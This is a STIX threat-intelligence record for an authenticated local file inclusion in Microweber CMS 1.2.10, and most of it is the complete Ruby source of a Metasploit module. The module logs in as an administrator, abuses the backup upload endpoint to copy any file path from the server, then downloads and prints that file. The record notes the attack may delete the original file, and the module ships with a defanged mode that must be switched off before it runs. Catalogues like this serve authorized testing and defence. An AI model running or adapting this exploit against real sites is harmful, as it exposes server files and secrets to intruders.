{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1dc42f1-33cc-4985-a39a-e7a57b4398f4",
    "created": "2024-08-14T16:32:17.843505Z",
    "modified": "2024-08-14T16:32:17.843509Z",
    "name": "Microweber CMS v1.2.10 Local File Inclusion (Authenticated)",
    "description": " Microweber CMS v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem. Upload function may delete the local file if the web service user has access.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/microweber_lfi.rb",
            "external_id": "microweber_lfi.rb"
        },
        {
            "source_name": "reference",
            "url": "https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microweber CMS v1.2.10 Local File Inclusion (Authenticated)',\n        'Description' => %q{\n          Microweber CMS v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.\n          Upload function may delete the local file if the web service user has access.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Talha Karakumru <talhakarakumru[at]gmail.com>'\n        ],\n        'References' => [\n          ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']\n        ],\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ OS_RESOURCE_LOSS ]\n        },\n        'Targets' => [\n          [ 'Microweber v1.2.10', {} ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2022-01-30'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),\n        OptString.new('USERNAME', [true, 'The admin\\'s username for Microweber']),\n        OptString.new('PASSWORD', [true, 'The admin\\'s password for Microweber']),\n        OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),\n        OptBool.new('DEFANGED_MODE', [true, 'Run in defanged mode', true])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'login')\n    })\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Microweber CMS cannot be reached.')\n    end\n\n    print_status 'Checking if it\\'s Microweber CMS.'\n\n    if res.code == 200 && !res.body.include?('Microweber')\n      print_error 'Microweber CMS has not been detected.'\n      Exploit::CheckCode::Safe\n    end\n\n    if res.code != 200\n      fail_with(Failure::Unknown, res.body)\n    end\n\n    print_good 'Microweber CMS has been detected.'\n\n    return check_version(res.body)\n  end\n\n  def check_version(res_body)\n    print_status 'Checking Microweber\\'s version.'\n\n    begin\n      major, minor, build = res_body[/Version:\\s+(\\d+\\.\\d+\\.\\d+)/].gsub(/Version:\\s+/, '').split('.')\n      version = Rex::Version.new(\"#{major}.#{minor}.#{build}\")\n    rescue NoMethodError, TypeError\n      return Exploit::CheckCode::Safe\n    end\n\n    if version == Rex::Version.new('1.2.10')\n      print_good 'Microweber version ' + version.to_s\n      return Exploit::CheckCode::Appears\n    end\n\n    print_error 'Microweber version ' + version.to_s\n\n    if version < Rex::Version.new('1.2.10')\n      print_warning 'The versions that are older than 1.2.10 have not been tested. You can follow the exploitation steps of the official vulnerability report.'\n      return Exploit::CheckCode::Unknown\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def try_login\n    print_status 'Trying to log in.'\n    res = send_request_cgi({\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'uri' => normalize_uri(target_uri.path, 'api', 'user_login'),\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'lang' => '',\n        'where_to' => 'admin_content'\n      }\n    })\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Log in request failed.')\n    end\n\n    if res.code != 200\n      fail_with(Failure::Unknown, res.body)\n    end\n\n    json_res = res.get_json_document\n\n    if !json_res['error'].nil? && json_res['error'] == 'Wrong username or password.'\n      fail_with(Failure::BadConfig, 'Wrong username or password.')\n    end\n\n    if !json_res['success'].nil? && json_res['success'] == 'You are logged in'\n      print_good 'You are logged in.'\n      return\n    end\n\n    fail_with(Failure::Unknown, 'An unknown error occurred.')\n  end\n\n  def try_upload\n    print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'\n\n    referer = ''\n    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?\n      referer = \"http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/\"\n    else\n      referer = full_uri\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),\n      'vars_get' => {\n        'src' => datastore['LOCAL_FILE_PATH']\n      },\n      'headers' => {\n        'Referer' => referer\n      }\n    })\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Upload request failed.')\n    end\n\n    if res.code != 200\n      fail_with(Failure::Unknown, res.body)\n    end\n\n    if res.headers['Content-Type'] == 'application/json'\n      json_res = res.get_json_document\n\n      if json_res['success']\n        print_good json_res['success']\n        return\n      end\n\n      fail_with(Failure::Unknown, res.body)\n    end\n\n    fail_with(Failure::BadConfig, 'Either the file cannot be read or the file does not exist.')\n  end\n\n  def try_download\n    filename = datastore['LOCAL_FILE_PATH'].include?('\\\\') ? datastore['LOCAL_FILE_PATH'].split('\\\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]\n    print_status 'Downloading ' + filename + ' from the backup folder.'\n\n    referer = ''\n    if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?\n      referer = \"http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/\"\n    else\n      referer = full_uri\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),\n      'vars_get' => {\n        'filename' => filename\n      },\n      'headers' => {\n        'Referer' => referer\n      }\n    })\n\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Download request failed.')\n    end\n\n    if res.code != 200\n      fail_with(Failure::Unknown, res.body)\n    end\n\n    if res.headers['Content-Type'] == 'application/json'\n      json_res = res.get_json_document\n\n      if json_res['error']\n        fail_with(Failure::Unknown, json_res['error'])\n        return\n      end\n    end\n\n    print_status res.body\n  end\n\n  def run\n    if datastore['DEFANGED_MODE']\n      warning = <<~EOF\n        Triggering this vulnerability may delete the local file if the web service user has the permission.\n        If you want to continue, disable the DEFANGED_MODE.\n        => set DEFANGED_MODE false\n      EOF\n\n      fail_with(Failure::BadConfig, warning)\n    end\n\n    try_login\n    try_upload\n    try_download\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-01-30"
}